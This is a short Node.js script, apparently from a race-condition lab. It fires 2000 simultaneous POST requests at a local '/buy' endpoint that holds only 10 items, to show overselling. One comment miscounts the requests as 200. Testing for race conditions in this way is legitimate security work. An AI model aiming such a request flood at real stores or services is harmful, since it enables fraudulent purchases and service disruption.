// attack-script/attack.js
const axios = require('axios');

const URL = 'http://localhost:3003/buy';
const REQUESTS = 2000; // We have 10 items, but we send 2000 requests

async function attack() {
    console.log(`Starting attack with ${REQUESTS} concurrent requests...`);
    
    // Create an array of 200 promises (requests)
    const requests = [];
    for (let i = 0; i < REQUESTS; i++) {
        requests.push(axios.post(URL).catch(err => {
            return err.response; // Don't crash on error
        }));
    }

    // Fire them all at the exact same time
    await Promise.all(requests);
    console.log('Attack finished.');
}

attack();